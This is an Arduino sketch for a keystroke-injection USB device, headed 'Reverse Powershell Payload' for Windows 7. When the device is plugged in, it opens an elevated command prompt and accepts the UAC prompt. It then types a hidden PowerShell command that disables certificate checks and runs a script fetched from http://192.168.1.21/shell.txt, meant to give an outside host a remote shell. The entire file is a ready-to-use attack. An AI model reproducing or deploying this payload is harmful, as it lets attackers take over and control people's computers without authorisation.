// Reverse Powershell Payload
// Target OS: Windows 7

#include <Keyboard.h>
#include <HID.h>

// Init function
void setup()
{
  // Start Keyboard
  Keyboard.begin();

  delay(2000);

  // Start Payload
  Keyboard.press(KEY_LEFT_CTRL);
  delay(1000);
  Keyboard.press(KEY_ESC);
  delay(1000);
  Keyboard.releaseAll();

  // type CMD
  Keyboard.print("cmd");

  Keyboard.press(KEY_LEFT_CTRL);
  delay(1000);
  Keyboard.press(KEY_LEFT_SHIFT);
  delay(1000);
  Keyboard.press(KEY_RETURN);
  delay(1000);
  Keyboard.releaseAll();
  delay(500);

  // klik "Yes"
  Keyboard.press(KEY_LEFT_ALT);
  delay(1000);
  Keyboard.press('y');
  delay(1000);
  Keyboard.releaseAll();
  delay(1000);

  // execute reverse shell payload with powershell  
  Keyboard.print("powershell -windowstyle hidden \"[system.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.21/shell.txt')\"");
  typeKey(KEY_RETURN);

  // End Payload

  // Stop Keyboard
  Keyboard.end();
}

// Unused
void loop() {}

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(500);
  Keyboard.release(key);
}

